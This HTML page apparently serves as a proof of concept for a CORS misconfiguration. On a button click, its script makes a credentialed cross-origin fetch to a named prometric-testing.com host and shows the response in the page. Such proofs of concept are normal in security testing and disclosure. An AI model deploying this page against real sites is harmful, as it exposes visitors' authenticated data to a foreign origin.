<html>
<body>
  <button onclick="myFunction()">Click me</button>
  <p id="demo">you should not see this after clicking the button</p>

  <script>
    function myFunction() {
      fetch('https://bil-cmspublic.prometric-testing.com/xmlhttp_info.txt', {
        mode: "cors",
        credentials: "include"
      })
      .then(blob => blob.json())
      .then(data => {
        document.getElementById("demo").innerHTML = data;
        return data;
      })
      .catch(e => {
        console.log(e);
        document.getElementById("demo").innerHTML = "Error: " + e;
        return e;
      });
  }
</script>
</body>
</html>
